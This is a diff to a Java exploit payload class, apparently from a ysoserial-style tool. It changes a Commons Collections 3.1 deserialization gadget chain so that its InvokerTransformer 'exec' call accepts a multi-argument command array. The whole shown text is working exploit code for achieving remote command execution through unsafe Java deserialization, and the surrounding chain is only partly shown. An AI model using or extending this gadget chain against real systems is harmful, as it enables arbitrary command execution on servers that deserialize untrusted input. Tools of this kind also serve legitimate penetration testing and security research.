@@ -33,8 +33,9 @@ import java.util.Map;
 @Dependencies({"commons-collections:commons-collections:3.1"})
 public class CommonsCollections10 extends PayloadRunner implements ObjectPayload<Hashtable>{
     @Override
-    public Hashtable getObject(String command) throws Exception {
-        final String[] execArgs = new String[]{command};
+    public Hashtable getObject(String ... command) throws Exception {
+        final String[] execArgs = command;
+        Class c = execArgs.length > 1 ? String[].class : String.class;
 
         final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
 
@@ -47,8 +48,8 @@ public class CommonsCollections10 extends PayloadRunner implements ObjectPayload
                 new Class[]{Object.class, Object[].class},
                 new Object[]{null, new Object[0]}),
             new InvokerTransformer("exec",
-                new Class[]{String.class},
-                execArgs),
+                new Class[]{c},
+                c == String.class ? execArgs : new Object[] {execArgs}),
             new ConstantTransformer(1)};
 
         final Map innerMap = new HashMap();
